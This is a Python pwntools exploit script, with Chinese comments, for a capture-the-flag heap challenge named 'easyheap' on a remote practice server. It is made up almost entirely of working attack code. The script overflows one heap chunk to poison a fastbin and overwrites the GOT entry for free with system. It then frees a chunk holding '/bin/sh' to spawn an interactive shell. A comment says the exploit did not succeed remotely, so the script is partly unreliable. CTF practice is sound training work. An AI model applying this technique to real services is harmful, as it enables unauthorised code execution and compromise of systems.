from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'easyheap'
port = 27917

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
堆溢出
'''

def create_heap(size:int, content:bytes=b'\x00'):
    global io
    io.sendafter("Your choice :", b'1')
    io.sendafter("Size of Heap : ", str(size).encode())
    io.sendafter("Content of heap:", content)
    io.recvuntil("SuccessFul\n")

def edit_heap(idx:int, size:int, content:bytes):
    global io
    io.sendafter("Your choice :", b'2')
    io.sendafter("Index :", str(idx).encode())
    io.sendafter("Size of Heap : ", str(size).encode())
    io.sendafter("Content of heap : ", content)
    io.recvuntil("Done !\n")

def delete_heap(idx:int):
    assert idx < 9 and idx >= 0, 'error!'
    global io
    io.sendafter("Your choice :", b'3')
    io.sendafter("Index :", str(idx).encode())
    io.recvuntil("Done !\n")
    
#这个在远程也打不了，实际上是触发了cat flag的。修改free的got表地址为
# magic addr: 0x6020C0
# target 0x6020ad 0x7f
# 分配3个chunk
create_heap(0x10)
create_heap(0x60)
create_heap(0x10)
# 删掉第2个
delete_heap(1)
payload = p64(0) * 3 + p64(0x71) + p64(0x6020ad)
edit_heap(0, len(payload), payload)
create_heap(0x60)
create_heap(0x60)
payload = 0x23 * b'\xff' + p64(io_elf.got['free'])
edit_heap(3, len(payload), payload)


payload = b'/bin/sh\x00' + b'\x00'*0x10
edit_heap(2, len(payload), payload)

# 往got表里面的地址写
payload = p64(io_elf.sym['system'])
edit_heap(0, len(payload), payload)


# STOP(1)
io.interactive()
